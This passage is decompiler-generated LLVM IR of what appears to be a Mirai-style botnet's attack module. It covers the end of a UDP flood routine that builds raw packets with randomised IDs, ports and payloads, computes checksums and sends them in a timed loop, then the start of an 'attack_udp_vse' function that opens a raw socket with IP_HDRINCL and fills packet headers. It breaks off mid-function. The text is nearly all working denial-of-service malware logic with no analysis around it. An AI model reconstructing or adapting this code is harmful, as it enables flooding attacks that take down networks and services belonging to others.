  %v4_d000 = add i32 %v3_d000, 10
  %v5_d000 = inttoptr i32 %v4_d000 to i16*
  store i16 %v3_cffc, i16* %v5_d000, align 2
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d008 = load i32, i32* @r6, align 4
  %v3_d008 = add i32 %v2_d008, 6
  %v4_d008 = inttoptr i32 %v3_d008 to i16*
  store i16 0, i16* %v4_d008, align 2
  %v0_d00c = load i32, i32* @r6, align 4
  %v1_d00c = add i32 %v0_d00c, 4
  %v2_d00c = inttoptr i32 %v1_d00c to i16*
  %v3_d00c = load i16, i16* %v2_d00c, align 2
  %v4_d00c = zext i16 %v3_d00c to i32
  store i32 %v4_d00c, i32* %r2.global-to-local, align 4
  store i32 %v0_d00c, i32* @r1, align 4
  %v0_d014 = load i32, i32* @sl, align 4
  store i32 %v0_d014, i32* %r3.global-to-local, align 4
  %v0_d018 = load i32, i32* @r5, align 4
  store i32 %v0_d018, i32* %r0.global-to-local, align 4
  %v4_d01c = call i32 @checksum_tcpudp(i32 %v0_d018, i32 %v0_d00c, i32 %v4_d00c, i32 %v0_d014)
  %v5_d01c = trunc i32 %v4_d01c to i16
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v3_d020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d020, i32* %r3.global-to-local, align 4
  %v3_d024 = mul i32 %v3_d020, 32
  store i32 %v3_d024, i32* %lr.global-to-local, align 4
  %v3_d028 = load i32, i32* @r6, align 4
  %v4_d028 = add i32 %v3_d028, 6
  %v5_d028 = inttoptr i32 %v4_d028 to i16*
  store i16 %v5_d01c, i16* %v5_d028, align 2
  %v0_d02c = load i32, i32* %lr.global-to-local, align 4
  %v1_d02c = load i32, i32* %r3.global-to-local, align 4
  %tmp53 = mul i32 %v1_d02c, -8
  %v5_d02c = add i32 %v0_d02c, %tmp53
  store i32 %v5_d02c, i32* %lr.global-to-local, align 4
  %v0_d030 = load i32, i32* @r6, align 4
  %v1_d030 = add i32 %v0_d030, 2
  %v2_d030 = inttoptr i32 %v1_d030 to i16*
  %v3_d030 = load i16, i16* %v2_d030, align 2
  %v4_d030 = zext i16 %v3_d030 to i32
  store i32 %v4_d030, i32* @r6, align 4
  %v1_d034 = load i32, i32* @r7, align 4
  %v2_d034 = add i32 %v1_d034, %v5_d02c
  store i32 %v2_d034, i32* @lr, align 4
  %v3_d038 = add i32 %v2_d034, 2
  %v4_d038 = inttoptr i32 %v3_d038 to i16*
  store i16 %v3_d030, i16* %v4_d038, align 2
  %v0_d03c = load i32, i32* @r8, align 4
  store i32 %v0_d03c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d048 = load i32, i32* @r5, align 4
  store i32 %v0_d048, i32* %r1.global-to-local, align 4
  %v0_d04c = load i32, i32* @fp, align 4
  store i32 %v0_d04c, i32* %r0.global-to-local, align 4
  %v0_d050 = load i32, i32* @lr, align 4
  %v6_d058 = call i32 @__libc_sendto(i32 %v0_d04c, i32 %v0_d048, i32 %v0_d03c, i32 16384, i32 %v0_d050, i32 16)
  %v3_d05c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v1_d064 = add i32 %v3_d05c, 1
  store i32 %v1_d064, i32* %r0.global-to-local, align 4
  store i32 %v1_d064, i32* %stack_var_-44, align 4
  %v6_d070 = icmp slt i32 %v1_d064, %arg2
  br i1 %v6_d070, label %dec_label_pc_d074, label %dec_label_pc_d218

dec_label_pc_d074:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf98
  %v1_d088 = phi i32 [ %v1_d064, %dec_label_pc_cfec ], [ 0, %dec_label_pc_cf98 ]
  %v5_d078 = mul i32 %v1_d088, 24
  %v1_d080 = load i32, i32* @r7, align 4
  %v2_d080 = add i32 %v1_d080, %v5_d078
  store i32 %v2_d080, i32* %r3.global-to-local, align 4
  %v1_d084 = add i32 %v2_d080, 20
  %v2_d084 = inttoptr i32 %v1_d084 to i8*
  %v3_d084 = load i8, i8* %v2_d084, align 1
  %v4_d084 = zext i8 %v3_d084 to i32
  store i32 %v4_d084, i32* %r2.global-to-local, align 4
  %v4_d088 = mul i32 %v1_d088, 4
  %v5_d088 = add i32 %v4_d088, %v2_cca8
  %v6_d088 = inttoptr i32 %v5_d088 to i32*
  %v7_d088 = load i32, i32* %v6_d088, align 4
  store i32 %v7_d088, i32* @r5, align 4
  %v1_d090 = add i32 %v7_d088, 20
  store i32 %v1_d090, i32* @r6, align 4
  %tmp54 = icmp ugt i8 %v3_d084, 31
  br i1 %tmp54, label %dec_label_pc_cfac, label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d074
  %v1_d098 = add i32 %v2_d080, 16
  %v2_d098 = inttoptr i32 %v1_d098 to i32*
  %v3_d098 = load i32, i32* %v2_d098, align 4
  %v0_d09c = call i32 @rand_next()
  store i32 %v0_d09c, i32* %r0.global-to-local, align 4
  %v3_d0a0 = load i32, i32* %stack_var_-44, align 4
  %v5_d0a8 = mul i32 %v3_d0a0, 24
  %v1_d0ac = and i32 %v3_d098, 16711680
  store i32 %v1_d0ac, i32* %ip.global-to-local, align 4
  %v3_d0b0 = udiv i32 %v3_d098, 16777216
  %v4_d0b4 = udiv i32 %v1_d0ac, 256
  %v5_d0b4 = or i32 %v4_d0b4, %v3_d0b0
  store i32 %v5_d0b4, i32* %r2.global-to-local, align 4
  %v1_d0b8 = load i32, i32* @r7, align 4
  %v2_d0b8 = add i32 %v1_d0b8, %v5_d0a8
  store i32 %v2_d0b8, i32* %r1.global-to-local, align 4
  %v1_d0bc = and i32 %v3_d098, 65280
  store i32 %v1_d0bc, i32* %r3.global-to-local, align 4
  %v1_d0c0 = add i32 %v2_d0b8, 20
  %v2_d0c0 = inttoptr i32 %v1_d0c0 to i8*
  %v3_d0c0 = load i8, i8* %v2_d0c0, align 1
  %v4_d0c0 = zext i8 %v3_d0c0 to i32
  store i32 %v4_d0c0, i32* %ip.global-to-local, align 4
  %v5_d0c8 = call i32 @llvm.bswap.i32(i32 %v3_d098)
  %v7_d0cc = lshr i32 %v0_d09c, %v4_d0c0
  %v8_d0cc = add i32 %v7_d0cc, %v5_d0c8
  store i32 %v8_d0cc, i32* %r2.global-to-local, align 4
  %v1_d0d0 = and i32 %v8_d0cc, 16711680
  store i32 %v1_d0d0, i32* %r0.global-to-local, align 4
  %v1_d0dc = and i32 %v8_d0cc, 65280
  store i32 %v1_d0dc, i32* %r1.global-to-local, align 4
  %v5_d0e4 = call i32 @llvm.bswap.i32(i32 %v8_d0cc)
  store i32 %v5_d0e4, i32* %r3.global-to-local, align 4
  %v0_d0e8 = load i32, i32* @sb, align 4
  %v3_d0e8 = icmp eq i32 %v0_d0e8, -1
  %v1_d0ec = load i32, i32* @r5, align 4
  %v2_d0ec = add i32 %v1_d0ec, 16
  %v3_d0ec = inttoptr i32 %v2_d0ec to i32*
  store i32 %v5_d0e4, i32* %v3_d0ec, align 4
  br i1 %v3_d0e8, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_d0f4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  %v0_d0f4 = call i32 @rand_next()
  store i32 %v0_d0f4, i32* %r0.global-to-local, align 4
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  %v1_d108 = load i32, i32* @r5, align 4
  %v2_d108 = add i32 %v1_d108, 12
  %v3_d108 = inttoptr i32 %v2_d108 to i32*
  store i32 %v0_d0f4, i32* %v3_d108, align 4
  br i1 %v9_d104, label %dec_label_pc_d110, label %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge

dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge:    ; preds = %dec_label_pc_d0f4
  %v1_cfcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cfc8

dec_label_pc_d110:                                ; preds = %dec_label_pc_d0f4, %dec_label_pc_cfb4
  %v0_d110 = call i32 @rand_next()
  %v1_d110 = trunc i32 %v0_d110 to i16
  %v3_d114 = load i32, i32* @r5, align 4
  %v4_d114 = add i32 %v3_d114, 4
  %v5_d114 = inttoptr i32 %v4_d114 to i16*
  store i16 %v1_d110, i16* %v5_d114, align 2
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v1_d11c = load i32, i32* @r4, align 4
  %v9_d11c = icmp eq i32 %v3_ce48, %v1_d11c
  br i1 %v9_d11c, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_d124:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v0_d124 = call i32 @rand_next()
  %v1_d124 = trunc i32 %v0_d124 to i16
  store i32 %v0_d124, i32* %r0.global-to-local, align 4
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v1_d12c = load i32, i32* @r4, align 4
  %v9_d12c = icmp eq i32 %v3_ce4c, %v1_d12c
  %v3_d130 = load i32, i32* @r5, align 4
  %v4_d130 = add i32 %v3_d130, 20
  %v5_d130 = inttoptr i32 %v4_d130 to i16*
  store i16 %v1_d124, i16* %v5_d130, align 2
  br i1 %v9_d12c, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_d138:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  %v0_d138 = call i32 @rand_next()
  %v1_d138 = trunc i32 %v0_d138 to i16
  store i32 %v0_d138, i32* %r0.global-to-local, align 4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  %v3_d144 = load i32, i32* @r6, align 4
  %v4_d144 = add i32 %v3_d144, 2
  %v5_d144 = inttoptr i32 %v4_d144 to i16*
  store i16 %v1_d138, i16* %v5_d144, align 2
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138
  %v0_d14c = load i32, i32* @r5, align 4
  %v1_d14c = add i32 %v0_d14c, 28
  store i32 %v1_d14c, i32* @r4, align 4
  store i32 %v1_d14c, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %r1.global-to-local, align 4
  %v2_d158 = call i32 @rand_alphastr(i32 %v1_d14c, i32 %v0_ce28)
  store i32 %v2_d158, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d164 = load i32, i32* @r4, align 4
  %v4_d164 = add i32 %v3_d164, %v0_ce28
  %v5_d164 = inttoptr i32 %v4_d164 to i8*
  store i8 0, i8* %v5_d164, align 1
  br label %dec_label_pc_cfec

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d16c.preheader, %dec_label_pc_d16c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d178 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_d178, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %ip.global-to-local, align 4
  %v3_d180 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d180, i32* %r1.global-to-local, align 4
  %v2_d184 = load i32, i32* @r4, align 4
  %v5_d184 = mul i32 %v2_d184, 4
  %v6_d184 = add i32 %v5_d184, %v2_cca8
  %v7_d184 = inttoptr i32 %v6_d184 to i32*
  store i32 %v2_d178, i32* %v7_d184, align 4
  %v0_d188 = load i32, i32* %ip.global-to-local, align 4
  %v1_d188 = load i32, i32* %r1.global-to-local, align 4
  %v4_d188 = mul i32 %v1_d188, 4
  %v5_d188 = add i32 %v4_d188, %v0_d188
  %v6_d188 = inttoptr i32 %v5_d188 to i32*
  %v7_d188 = load i32, i32* %v6_d188, align 4
  store i32 %v7_d188, i32* %r3.global-to-local, align 4
  %v1_d18c = inttoptr i32 %v7_d188 to i8*
  %v2_d18c = load i8, i8* %v1_d18c, align 1
  %tmp55 = urem i8 %v2_d18c, 16
  %v1_d190 = zext i8 %tmp55 to i32
  %v1_d194 = or i32 %v1_d190, 64
  store i32 %v1_d194, i32* %r2.global-to-local, align 4
  %v1_d198 = trunc i32 %v1_d194 to i8
  store i8 %v1_d198, i8* %v1_d18c, align 1
  %v0_d19c = load i32, i32* %r3.global-to-local, align 4
  %v1_d19c = inttoptr i32 %v0_d19c to i8*
  %v2_d19c = load i8, i8* %v1_d19c, align 1
  %v1_d1a0 = and i8 %v2_d19c, -16
  %v1_d1a4 = or i8 %v1_d1a0, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_d1a4, i8* %v1_d19c, align 1
  %v0_d1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_d1b0 = trunc i32 %v0_d1b0 to i8
  %v2_d1b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b0 = add i32 %v2_d1b0, 9
  %v4_d1b0 = inttoptr i32 %v3_d1b0 to i8*
  store i8 %v1_d1b0, i8* %v4_d1b0, align 1
  %v2_d1b8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b8 = add i32 %v2_d1b8, 1
  %v4_d1b8 = inttoptr i32 %v3_d1b8 to i8*
  store i8 %v5_cce0, i8* %v4_d1b8, align 1
  store i32 %v4_d1bc, i32* %ip.global-to-local, align 4
  %v0_d1c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_d1c0 = mul i32 %v0_d1c0, 32
  store i32 %v3_d1c0, i32* %r0.global-to-local, align 4
  %v2_d1c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1c4 = add i32 %v2_d1c4, 8
  %v4_d1c4 = inttoptr i32 %v3_d1c4 to i8*
  store i8 %v5_cd18, i8* %v4_d1c4, align 1
  %v0_d1c8 = load i32, i32* @sb, align 4
  %v1_d1c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1c8 = add i32 %v1_d1c8, 12
  %v3_d1c8 = inttoptr i32 %v2_d1c8 to i32*
  store i32 %v0_d1c8, i32* %v3_d1c8, align 4
  %v0_d1cc = load i32, i32* %r0.global-to-local, align 4
  %v1_d1cc = load i32, i32* %r1.global-to-local, align 4
  %tmp56 = mul i32 %v1_d1cc, -8
  %v5_d1cc = add i32 %v0_d1cc, %tmp56
  %v1_d1d0 = load i32, i32* @r7, align 4
  %v2_d1d0 = add i32 %v5_d1cc, %v1_d1d0
  store i32 %v2_d1d0, i32* %r2.global-to-local, align 4
  %v1_d1d4 = add i32 %v2_d1d0, 16
  %v2_d1d4 = inttoptr i32 %v1_d1d4 to i32*
  %v3_d1d4 = load i32, i32* %v2_d1d4, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_d1dc = load i32, i32* %r3.global-to-local, align 4
  %v2_d1dc = add i32 %v1_d1dc, 16
  %v3_d1dc = inttoptr i32 %v2_d1dc to i32*
  store i32 %v3_d1d4, i32* %v3_d1dc, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v0_d1e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d1e4 = add i32 %v0_d1e4, 1
  store i32 %v1_d1e4, i32* @r4, align 4
  %v0_d1e8 = load i32, i32* @r6, align 4
  %v1_d1e8 = trunc i32 %v0_d1e8 to i16
  %v2_d1e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1e8 = add i32 %v2_d1e8, 2
  %v4_d1e8 = inttoptr i32 %v3_d1e8 to i16*
  store i16 %v1_d1e8, i16* %v4_d1e8, align 2
  %v0_d1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_d1ec = add i32 %v0_d1ec, 20
  store i32 %v1_d1ec, i32* %r1.global-to-local, align 4
  %v0_d1f0 = load i32, i32* @r8, align 4
  %v1_d1f0 = trunc i32 %v0_d1f0 to i16
  %v3_d1f0 = add i32 %v0_d1ec, 4
  %v4_d1f0 = inttoptr i32 %v3_d1f0 to i16*
  store i16 %v1_d1f0, i16* %v4_d1f0, align 2
  %v0_d1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1f4 = trunc i32 %v0_d1f4 to i16
  %v2_d1f4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f4 = add i32 %v2_d1f4, 6
  %v4_d1f4 = inttoptr i32 %v3_d1f4 to i16*
  store i16 %v1_d1f4, i16* %v4_d1f4, align 2
  %v0_d1f8 = load i32, i32* @sl, align 4
  %v1_d1f8 = trunc i32 %v0_d1f8 to i16
  %v2_d1f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f8 = add i32 %v2_d1f8, 20
  %v4_d1f8 = inttoptr i32 %v3_d1f8 to i16*
  store i16 %v1_d1f8, i16* %v4_d1f8, align 2
  store i32 %v4_d1fc, i32* %r3.global-to-local, align 4
  %v0_d200 = load i32, i32* @r4, align 4
  %v1_d200 = load i32, i32* %r0.global-to-local, align 4
  %v0_d204 = load i32, i32* @r5, align 4
  %v1_d204 = trunc i32 %v0_d204 to i16
  %v2_d204 = load i32, i32* %r1.global-to-local, align 4
  %v3_d204 = add i32 %v2_d204, 4
  %v4_d204 = inttoptr i32 %v3_d204 to i16*
  store i16 %v1_d204, i16* %v4_d204, align 2
  %v0_d208 = load i32, i32* %r3.global-to-local, align 4
  %v1_d208 = trunc i32 %v0_d208 to i16
  %v2_d208 = load i32, i32* %r1.global-to-local, align 4
  %v3_d208 = add i32 %v2_d208, 2
  %v4_d208 = inttoptr i32 %v3_d208 to i16*
  store i16 %v1_d208, i16* %v4_d208, align 2
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %stack_var_-44, align 4
  %v5_d210 = icmp slt i32 %v0_d200, %v1_d200
  br i1 %v5_d210, label %dec_label_pc_d16c, label %dec_label_pc_cf84.preheader

dec_label_pc_d218:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf84
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d21c = call i32 @__GI_time(i32* null)
  store i32 %v2_d21c, i32* %r0.global-to-local, align 4
  store i32 %v2_cdc0, i32* %r3.global-to-local, align 4
  %v6_d228 = icmp slt i32 %v2_cdc0, %v2_d21c
  br i1 %v6_d228, label %dec_label_pc_d22c, label %dec_label_pc_cf84

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d218, %entry, %dec_label_pc_d238
  %v1_d234 = phi i32 [ %v3_cdd4, %entry ], [ %v1_d23c, %dec_label_pc_d238 ], [ %v2_d21c, %dec_label_pc_d218 ]
  store i32 %v27_cc7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_d234

dec_label_pc_d238:                                ; preds = %dec_label_pc_cde4
  %v0_d238 = load i32, i32* @fp, align 4
  store i32 %v0_d238, i32* %r0.global-to-local, align 4
  %v1_d23c = call i32 @__GI___libc_close(i32 %v0_d238)
  store i32 %v1_d23c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d22c

; uselistorder directives
  uselistorder i32 %v1_d23c, { 1, 0 }
  uselistorder i32 %v0_d138, { 1, 0 }
  uselistorder i32 %v0_d124, { 1, 0 }
  uselistorder i32 %v1_d11c, { 1, 0 }
  uselistorder i32 %v5_d0e4, { 1, 0 }
  uselistorder i32 %v3_d098, { 2, 1, 3, 0 }
  uselistorder i32 %v1_d064, { 1, 2, 0, 3 }
  uselistorder i32 %v5_d02c, { 1, 0 }
  uselistorder i32 %v4_d01c, { 1, 0 }
  uselistorder i32 %v0_d00c, { 1, 0, 2 }
  uselistorder i32 %v2_cffc, { 1, 0 }
  uselistorder i1 %v2_d140, { 1, 0 }
  uselistorder i1 %v9_d104, { 1, 0 }
  uselistorder i32 %v1_cf44, { 1, 0 }
  uselistorder i16 %v5_ced4, { 1, 0 }
  uselistorder i32 %v3_cec0, { 1, 0 }
  uselistorder i32 %v3_cebc, { 1, 0 }
  uselistorder i32 %v3_ceb8, { 1, 0 }
  uselistorder i32 %v1_ce78, { 2, 3, 1, 0 }
  uselistorder i32 %v1_ce74, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v3_ce48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_ce44, { 1, 2, 0 }
  uselistorder i32 %v3_ce3c, { 1, 0 }
  uselistorder i32 %v0_ce28, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_cdd4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_cdc0, { 1, 0 }
  uselistorder i32 %v1_cd9c, { 2, 1, 3, 0 }
  uselistorder i32 %v6_cd5c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_cd28, { 1, 0 }
  uselistorder i8 %v5_cd18, { 1, 0, 2 }
  uselistorder i32 %v6_ccfc, { 1, 0 }
  uselistorder i32 %v7_cce4, { 1, 0, 2 }
  uselistorder i32 %v6_ccc0, { 1, 0 }
  uselistorder i32 %v2_cca8, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 8, 3, 4, 5, 6, 7, 10, 9, 12, 11, 14, 15, 13, 17, 16, 19, 18, 20, 22, 21, 29, 23, 24, 25, 26, 27, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32 %arg2, { 2, 5, 4, 6, 0, 3, 1, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_d22c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d16c, { 1, 0 }
  uselistorder label %dec_label_pc_d14c, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf84, { 1, 0 }
  uselistorder label %dec_label_pc_cee0, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d248 = load i32, i32* @r4, align 4
  %v27_d248 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d274 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d278 = load i32, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d280 = load i32, i32* @r7, align 4
  store i32 %v0_d280, i32* %r3.global-to-local, align 4
  store i32 %v2_d274, i32* @sb, align 4
  %v0_d288 = load i32, i32* @r5, align 4
  %v4_d28c = inttoptr i32 %v0_d278 to i32*
  %v5_d28c = call i32 @attack_get_opt_int(i32 %v0_d288, i32* %v4_d28c, i32 2, i32 %v0_d280)
  %v1_d298 = urem i32 %v5_d28c, 256
  store i32 %v1_d298, i32* %ip.global-to-local, align 4
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d2a8 = load i32, i32* @r5, align 4
  %v5_d2ac = trunc i32 %v5_d28c to i8
  %v6_d2b0 = inttoptr i32 %v0_d29c to i32*
  %v7_d2b0 = call i32 @attack_get_opt_int(i32 %v0_d2a8, i32* %v6_d2b0, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_d2b4 = load i32, i32* @r4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r5, align 4
  %v5_d2c8 = inttoptr i32 %v0_d2b4 to i32*
  %v6_d2c8 = call i32 @attack_get_opt_int(i32 %v0_d2c4, i32* %v5_d2c8, i32 4, i32 64)
  %v0_d2d0 = load i32, i32* @r4, align 4
  %v1_d2d4 = urem i32 %v6_d2c8, 256
  store i32 %v1_d2d4, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d2dc = load i32, i32* @r7, align 4
  store i32 %v0_d2dc, i32* %r3.global-to-local, align 4
  %v0_d2e0 = load i32, i32* @r5, align 4
  %v6_d2e8 = inttoptr i32 %v0_d2d0 to i32*
  %v7_d2e8 = call i32 @attack_get_opt_int(i32 %v0_d2e0, i32* %v6_d2e8, i32 5, i32 %v0_d2dc)
  %v1_d2f4 = urem i32 %v7_d2e8, 256
  store i32 %v1_d2f4, i32* %ip.global-to-local, align 4
  %v0_d2f8 = load i32, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d304 = load i32, i32* @r5, align 4
  %v5_d30c = inttoptr i32 %v0_d2f8 to i32*
  %v6_d30c = call i32 @attack_get_opt_int(i32 %v0_d304, i32* %v5_d30c, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_d314 = load i32, i32* @r4, align 4
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d324 = load i32, i32* @r5, align 4
  %v5_d328 = inttoptr i32 %v0_d314 to i32*
  %v6_d328 = call i32 @attack_get_opt_int(i32 %v0_d324, i32* %v5_d328, i32 7, i32 27015)
  store i32 %v6_d328, i32* @r4, align 4
  %v0_d330 = load i32, i32* @r7, align 4
  store i32 %v0_d330, i32* %stack_var_-48, align 4
  %v1_d338 = inttoptr i32 %v0_d330 to i32*
  %v2_d338 = call i32 @__GI_time(i32* %v1_d338)
  %v1_d33c = load i32, i32* @r6, align 4
  %v2_d33c = add i32 %v1_d33c, %v2_d338
  %v1_d348 = call i32 @table_unlock_val(i32 36)
  %v3_d354 = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d368 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_d36c = icmp eq i32 %v3_d368, -1
  store i32 %v3_d368, i32* @sl, align 4
  br i1 %v7_d36c, label %dec_label_pc_d698, label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d380 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d380, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_d388 = load i32, i32* @r7, align 4
  store i32 %v0_d388, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d394 = call i32 @__GI_setsockopt(i32 %v3_d368, i32 %v0_d388, i32 3, i32 %v6_d380, i32 ptrtoint (i32* @0 to i32))
  %v7_d398 = icmp eq i32 %v5_d394, -1
  br i1 %v7_d398, label %dec_label_pc_d6a4, label %dec_label_pc_d3a0

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d378
  store i32 %v6_d30c, i32* %r2.global-to-local, align 4
  %v0_d3ac = load i32, i32* @r4, align 4
  %v3_d3b0 = mul i32 %v6_d30c, 65536
  store i32 %v3_d3b0, i32* %ip.global-to-local, align 4
  %v3_d3b4 = urem i32 %v7_d2b0, 65536
  store i32 %v3_d3b4, i32* %r3.global-to-local, align 4
  %v3_d3b8 = urem i32 %v6_d30c, 65536
  %v3_d3bc = urem i32 %v0_d3ac, 65536
  %v0_d3c0 = load i32, i32* @fp, align 4
  %v2_d3c0 = icmp eq i32 %v0_d3c0, 0
  %v0_d3c4 = load i32, i32* @r7, align 4
  store i32 %v0_d3c4, i32* %stack_var_-44, align 4
  br i1 %v2_d3c0, label %dec_label_pc_d504.preheader, label %dec_label_pc_d3d8

dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3a0
  %tmp39 = mul i32 %v7_d2b0, 256
  %v3_d3e0 = and i32 %tmp39, 65280
  store i32 %v3_d3e0, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v0_d3ac, 256
  %v3_d3e4 = and i32 %tmp40, 65280
  %tmp41 = udiv i32 %v7_d2b0, 256
  %v4_d3ec = urem i32 %tmp41, 256
  %v5_d3ec = or i32 %v4_d3ec, %tmp39
  %tmp42 = udiv i32 %v0_d3ac, 256
  %v4_d3f0 = urem i32 %tmp42, 256
